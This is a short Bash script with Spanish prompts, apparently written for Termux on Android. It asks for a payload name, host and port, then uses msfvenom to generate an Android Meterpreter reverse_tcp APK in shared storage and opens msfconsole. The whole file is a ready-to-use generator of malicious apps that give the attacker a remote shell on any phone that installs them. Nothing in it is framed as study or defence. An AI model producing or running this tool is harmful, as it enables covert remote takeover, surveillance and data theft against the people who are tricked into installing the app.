clear
apt update && apt upgrade -y
apt install toilet -y
clear
echo ""
sleep 1
toilet -f pagga PAY_GEN --filter metal
sleep 2
echo ""
echo ""
echo -e -n "\e[0;36mIngrese el nombre del Payload\e[0m > "
read name
sleep 1
echo ""
echo ""
echo -e -n "\e[0;36mIngrese su Host\e[0m > "
read host
sleep 1
echo ""
echo ""
echo -e -n "\e[0;36mIngrese su Puerto\e[0m > "
read port
sleep 2
echo ""
echo ""
echo -e "\e[0;35mCreando "$name".apk , Espere...\e[0m"

cd $HOME
msfvenom -p android/meterpreter/reverse_tcp LHOST=$host LPORT=$port R > /storage/emulated/0/$name.apk
clear
sleep 1
echo -e "\e[1;32mEl payload "$name".apk , Ha sido generado con exito\e[0m"
echo -e "\e[1;34mTu apk se ha guardado en /storage/emulated/0/\e[0m"
sleep 3
echo ""
echo ""
toilet -f pagga msfconsole
sleep 3
msfconsole
exit

